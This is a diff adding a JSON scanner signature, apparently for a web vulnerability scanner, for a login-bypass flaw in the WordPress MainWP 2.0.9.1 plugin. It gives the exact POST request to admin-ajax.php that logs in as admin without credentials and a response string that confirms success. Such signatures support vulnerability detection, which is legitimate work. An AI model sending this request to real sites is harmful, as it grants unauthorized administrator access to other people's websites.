@@ -1,0 +1,23 @@
+{
+  "cms": "wordpress",
+  "version": "",
+  "author": "wolf",
+  "desc": "WordPress MainWP 2.0.9.1 存在登录绕过漏洞，可直接登录管理后台",
+  "tags": [
+    "逻辑漏洞"
+  ],
+  "refer": [
+    "",
+    ""
+  ],
+  "request": {
+    "path": "/wp-admin/admin-ajax.php?action=init&login_required=1&user=admin",
+    "method": "POST",
+    "parameter": ""
+  },
+  "response": {
+    "position": "body",
+    "regex": false,
+    "match": "<div id='wpadminbar'"
+  }
+}
